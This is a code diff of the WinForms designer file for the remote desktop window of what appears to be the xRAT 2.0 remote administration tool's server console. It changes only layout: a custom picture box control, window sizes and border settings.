@@ -1,4 +1,6 @@
-﻿namespace xServer.Forms
+﻿using xServer.Controls;
+
+namespace xServer.Forms
 {
     partial class FrmRemoteDesktop
     {
@@ -35,7 +37,7 @@
             this.lblQuality = new System.Windows.Forms.Label();
             this.lblQualityShow = new System.Windows.Forms.Label();
             this.btnMouse = new System.Windows.Forms.Button();
-            this.picDesktop = new System.Windows.Forms.PictureBox();
+            this.picDesktop = new PictureBoxEx();
             this.panelTop = new System.Windows.Forms.Panel();
             this.cbMonitors = new System.Windows.Forms.ComboBox();
             this.btnHide = new System.Windows.Forms.Button();
@@ -113,8 +115,7 @@
             this.picDesktop.Dock = System.Windows.Forms.DockStyle.Fill;
             this.picDesktop.Location = new System.Drawing.Point(0, 0);
             this.picDesktop.Name = "picDesktop";
-            this.picDesktop.Size = new System.Drawing.Size(797, 501);
-            this.picDesktop.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.picDesktop.Size = new System.Drawing.Size(748, 438);
             this.picDesktop.TabIndex = 0;
             this.picDesktop.TabStop = false;
             this.picDesktop.MouseDown += new System.Windows.Forms.MouseEventHandler(this.picDesktop_MouseDown);
@@ -171,15 +172,16 @@
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(797, 501);
+            this.ClientSize = new System.Drawing.Size(748, 438);
             this.Controls.Add(this.btnShow);
             this.Controls.Add(this.panelTop);
             this.Controls.Add(this.picDesktop);
             this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
             this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
             this.KeyPreview = true;
-            this.MinimizeBox = false;
-            this.MinimumSize = new System.Drawing.Size(570, 421);
+            this.MaximizeBox = false;
+            this.MinimumSize = new System.Drawing.Size(640, 480);
             this.Name = "FrmRemoteDesktop";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
             this.Text = "xRAT 2.0 - Remote Desktop []";
@@ -205,7 +207,7 @@
         private System.Windows.Forms.Panel panelTop;
         private System.Windows.Forms.Button btnHide;
         private System.Windows.Forms.Button btnShow;
-        private System.Windows.Forms.PictureBox picDesktop;
+        private PictureBoxEx picDesktop;
         private System.Windows.Forms.ComboBox cbMonitors;
     }
 }
